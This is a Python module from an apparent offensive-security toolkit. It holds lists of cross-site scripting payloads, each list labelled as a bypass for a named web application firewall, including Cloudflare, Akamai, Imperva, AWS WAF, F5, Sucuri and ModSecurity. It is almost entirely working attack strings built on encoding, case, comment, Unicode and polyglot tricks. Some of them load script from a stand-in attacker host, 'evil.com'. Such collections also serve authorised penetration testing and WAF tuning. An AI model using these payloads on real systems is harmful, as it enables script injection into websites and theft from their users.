#!/usr/bin/env python3

"""
WAF Bypass XSS Payloads

Specialized payloads designed to bypass common Web Application Firewalls.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Вс 10 авг 2025 19:35:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Optional


class WAFBypassPayloads:
    """WAF bypass XSS payload collection"""
    
    @staticmethod
    def get_cloudflare_bypass() -> List[str]:
        """Cloudflare WAF bypass payloads"""
        return [
            # Case variations
            '<ScRiPt>alert(1)</ScRiPt>',
            '<SCRIPT>alert(1)</SCRIPT>',
            '<Script>alert(1)</Script>',
            
            # HTML entity encoding
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            
            # Unicode normalization
            '<script>ⒶⓁⒺⓇⓉ(1)</script>',
            '<script>𝔞𝔩𝔢𝔯𝔱(1)</script>',
            '<script>𝕒𝕝𝕖𝕣𝕥(1)</script>',
            
            # Whitespace bypass
            '<script\n>alert(1)</script>',
            '<script\t>alert(1)</script>',
            '<script\r>alert(1)</script>',
            '<script\x0a>alert(1)</script>',
            '<script\x0d>alert(1)</script>',
            
            # Comment injection
            '<script>/**/alert(1)</script>',
            '<script>alert/**/(1)</script>',
            '<script>alert(/**/1)</script>',
            
            # Alternative events
            '<svg/onload=alert(1)>',
            '<svg\nonload=alert(1)>',
            '<svg\tonload=alert(1)>',
            '<svg onload=alert`1`>',
            
            # String fragmentation
            '<script>eval("ale"+"rt(1)")</script>',
            '<script>window["ale"+"rt"](1)</script>',
            '<script>this["ale"+"rt"](1)</script>',
        ]
    
    @staticmethod
    def get_akamai_bypass() -> List[str]:
        """Akamai WAF bypass payloads"""
        return [
            # Template literals
            '<script>alert`1`</script>',
            '<script>eval`alert\\`1\\``</script>',
            '<script>Function`alert\\`1\\```</script>',
            
            # Unicode escape sequences
            '<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>',
            '<script>\\x61\\x6C\\x65\\x72\\x74(1)</script>',
            '<script>eval("\\u0061\\u006C\\u0065\\u0072\\u0074(1)")</script>',
            
            # Octal encoding
            '<script>\\141\\154\\145\\162\\164(1)</script>',
            '<script>eval("\\141\\154\\145\\162\\164(1)")</script>',
            
            # Zero-width characters
            '<script>ale\\u200Brt(1)</script>',
            '<script>ale\\u200Crt(1)</script>',
            '<script>ale\\u200Drt(1)</script>',
            '<script>ale\\uFEFFrt(1)</script>',
            
            # Space variations
            '<script>alert\\u0020(1)</script>',
            '<script>alert\\u00A0(1)</script>',
            '<script>alert\\u1680(1)</script>',
            '<script>alert\\u2000(1)</script>',
            
            # Alternative syntax
            '<script>window[atob("YWxlcnQ=")](1)</script>',
            '<script>this[atob("YWxlcnQ=")](1)</script>',
            '<script>self[atob("YWxlcnQ=")](1)</script>',
        ]
    
    @staticmethod
    def get_imperva_bypass() -> List[str]:
        """Imperva/Incapsula WAF bypass payloads"""
        return [
            # Mixed case with special chars
            '<ScRiPt/**/sRc=//evil.com></ScRiPt>',
            '<ScRiPt%20sRc=//evil.com></ScRiPt>',
            '<ScRiPt%09sRc=//evil.com></ScRiPt>',
            
            # Event handlers with encoding
            '<img/src="x"/onerror=alert(1)>',
            '<img%20src="x"%20onerror=alert(1)>',
            '<img%2Fsrc="x"%2Fonerror=alert(1)>',
            
            # SVG with namespaces
            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">',
            '<svg xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert(1)">',
            
            # Data attributes
            '<div data-alert="alert(1)" onclick="eval(this.dataset.alert)">',
            '<span data-xss="alert(1)" onmouseover="Function(this.dataset.xss)()">',
            
            # Form elements
            '<form action="javascript:alert(1)"><input type="submit">',
            '<form><button formaction="javascript:alert(1)">',
            '<input type="image" formaction="javascript:alert(1)">',
            
            # CSS expression alternatives
            '<div style="width:expression(alert(1))">',
            '<div style="background:url(javascript:alert(1))">',
            '<div style="list-style:url(javascript:alert(1))">',
        ]
    
    @staticmethod
    def get_aws_waf_bypass() -> List[str]:
        """AWS WAF bypass payloads"""
        return [
            # Double encoding
            '%253Cscript%253Ealert(1)%253C/script%253E',
            '%2527%253E%253Cscript%253Ealert(1)%253C/script%253E',
            
            # UTF-8 overlong encoding
            '%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE',
            '%E0%80%BCscript%E0%80%BEalert(1)%E0%80%BC/script%E0%80%BE',
            
            # UTF-16 encoding
            '%u003Cscript%u003Ealert(1)%u003C/script%u003E',
            '%u0027%u003E%u003Cscript%u003Ealert(1)%u003C/script%u003E',
            
            # Alternative protocols
            '<iframe src="data:text/html;charset=utf-16,%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00(%001%00)%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00">',
            
            # Polyglot payloads
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>',
            'javascript:/*--></title></style></textarea></script></xmp><img/src=x onerror=alert(1)>',
            
            # Event handler variations
            '<body/onload=alert(1)>',
            '<body%20onload=alert(1)>',
            '<body%0aonload=alert(1)>',
            '<body%0donload=alert(1)>',
            '<body%09onload=alert(1)>',
        ]
    
    @staticmethod
    def get_f5_asm_bypass() -> List[str]:
        """F5 ASM WAF bypass payloads"""
        return [
            # NULL byte injection
            '<script>alert(1)</script>%00',
            '<script>alert(1)%00</script>',
            '<script%00>alert(1)</script>',
            
            # Path traversal in JS
            '<script src="../../../../../evil.js"></script>',
            '<script src="..\\..\\..\\..\\..\\evil.js"></script>',
            
            # Alternative quotes
            '<script>alert("1")</script>',
            '<script>alert(\'1\')</script>',
            '<script>alert(`1`)</script>',
            '<script>alert(\\`1\\`)</script>',
            
            # Mathematical operations
            '<script>alert(0x1)</script>',
            '<script>alert(01)</script>',
            '<script>alert(1.0)</script>',
            '<script>alert(1e0)</script>',
            '<script>alert(0b1)</script>',
            
            # Function alternatives
            '<script>[].map(alert,1)</script>',
            '<script>[1].find(alert)</script>',
            '<script>[1].filter(alert)</script>',
            '<script>[1].reduce(alert)</script>',
            '<script>[1].forEach(alert)</script>',
        ]
    
    @staticmethod
    def get_sucuri_bypass() -> List[str]:
        """Sucuri WAF bypass payloads"""
        return [
            # Encoding combinations
            '<scri%70t>alert(1)</scri%70t>',
            '<scri\\x70t>alert(1)</scri\\x70t>',
            '<scri\\u0070t>alert(1)</scri\\u0070t>',
            
            # HTML5 entities
            '<script>alert&lpar;1&rpar;</script>',
            '<script>alert&num;40&semi;1&num;41&semi;</script>',
            
            # CSS unicode
            '<style>@import"\\6A \\61 \\76 \\61 \\73 \\63 \\72 \\69 \\70 \\74 \\3A alert(1)"</style>',
            
            # Alternative event timing
            '<img src=x onerror=setTimeout(alert,1,1)>',
            '<img src=x onerror=setInterval(alert,1,1)>',
            '<img src=x onerror=requestAnimationFrame(alert.bind(null,1))>',
            
            # Iframe variations
            '<iframe src="javascript:&quot;alert(1)&quot;">',
            '<iframe src="javascript:&apos;alert(1)&apos;">',
            '<iframe src="javascript:\\u0027alert(1)\\u0027">',
            
            # Document methods
            '<script>document.createElement("script").innerHTML="alert(1)"</script>',
            '<script>document.implementation.createHTMLDocument().write("<script>alert(1)</script>")</script>',
        ]
    
    @staticmethod
    def get_modsecurity_bypass() -> List[str]:
        """ModSecurity WAF bypass payloads"""
        return [
            # Rule evasion
            '<script>/**/alert/**/(/*(*/1/*)*//*)*/)</script>',
            '<script>/**/alert/**/(/*(*/String.fromCharCode(49)/*)*//*)*/)</script>',
            
            # Comment variations
            '<script>/*!alert(1)*/</script>',
            '<script>/*! alert(1) */</script>',
            '<script>//alert(1)\\n</script>',
            '<script>#alert(1)\\n</script>',
            
            # Line continuation
            '<script>ale\\\\\\nrt(1)</script>',
            '<script>ale\\\\\\rrt(1)</script>',
            '<script>ale\\\\\\r\\nrt(1)</script>',
            
            # Regex bypass
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<scr<script>ipt>alert(1)</script>',
            '<<script>script>alert(1)<</script>/script>',
            
            # Content-type tricks
            '<script type="text/javascript">alert(1)</script>',
            '<script type="application/javascript">alert(1)</script>',
            '<script type="text/ecmascript">alert(1)</script>',
            '<script type="application/ecmascript">alert(1)</script>',
        ]
    
    @staticmethod
    def get_all() -> List[str]:
        """Get all WAF bypass XSS payloads"""
        payloads = []
        payloads.extend(WAFBypassPayloads.get_cloudflare_bypass())
        payloads.extend(WAFBypassPayloads.get_akamai_bypass())
        payloads.extend(WAFBypassPayloads.get_imperva_bypass())
        payloads.extend(WAFBypassPayloads.get_aws_waf_bypass())
        payloads.extend(WAFBypassPayloads.get_f5_asm_bypass())
        payloads.extend(WAFBypassPayloads.get_sucuri_bypass())
        payloads.extend(WAFBypassPayloads.get_modsecurity_bypass())
        return payloads